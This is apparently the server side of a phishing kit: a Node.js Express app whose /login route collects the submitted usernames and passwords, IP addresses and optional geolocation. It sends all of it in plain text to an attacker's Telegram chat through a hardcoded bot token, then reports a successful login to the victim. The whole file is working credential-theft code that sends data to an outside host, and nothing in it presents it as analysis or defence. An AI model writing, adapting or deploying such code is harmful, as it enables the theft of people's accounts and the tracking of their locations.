const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = 3000;

// Telegram bot configuration
const TELEGRAM_BOT_TOKEN = '7623132208:AAHVNRLt2aTiF8sy2xADLdaEbN1zIDI543w'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '6144104455'; // Replace with your chat ID

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files (e.g., your HTML page)
app.use(express.static(__dirname));

// Function to send data to Telegram
const sendToTelegram = async (message) => {
    try {
        const telegramAPI = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramAPI, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
        });
        console.log('Message sent to Telegram.');
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
};

// Route to handle login requests
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const timestamp = new Date().toISOString();

    // Add placeholders for geolocation data
    const latitude = req.body.latitude || 'Unknown';
    const longitude = req.body.longitude || 'Unknown';

    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }

    // Create message to send to Telegram
    const message = `
*New Login Attempt*:
- Username: ${username}
- Password: ${password}
- IP Address: ${ip}
- Timestamp: ${timestamp}
- Latitude: ${latitude}
- Longitude: ${longitude}
    `;

    // Send the message to Telegram
    sendToTelegram(message);

    // Respond to the client
    res.status(200).json({ message: 'Login successfull.' });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
